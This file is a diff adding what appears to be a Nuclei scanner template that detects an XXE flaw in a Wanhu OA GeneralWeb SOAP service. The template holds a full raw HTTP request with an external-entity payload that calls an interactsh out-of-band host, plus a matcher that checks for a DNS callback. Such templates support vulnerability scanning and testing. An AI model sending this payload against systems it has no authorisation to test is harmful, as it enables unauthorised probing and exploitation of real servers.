@@ -1,0 +1,39 @@
+id: wanhu-GeneralWeb-xxe
+
+info:
+  name: wanhu-GeneralWeb-xxe
+  author: msk
+
+
+requests:
+  - raw:
+      - |
+        POST /defaultroot/xfservices/././././GeneralWeb;1.js HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml;charset=UTF-8
+        User-Agent: Mozilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
+        Accept-Encoding: gzip, deflate
+        SOAPAction: 
+        Cache-Control: no-cache
+        Pragma: no-cache
+        Connection: close
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:gen="http://com.whir.service/GeneralWeb">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <gen:OAManager>
+                 <gen:input>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+        &lt;!DOCTYPE root [
+        &lt;!ENTITY x SYSTEM "http://{{interactsh-url}}"&gt;]&gt;
+        &lt;root&gt;&amp;x;&lt;/root&gt;</gen:input>
+              </gen:OAManager>
+           </soapenv:Body>
+        </soapenv:Envelope>
+
+
+
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
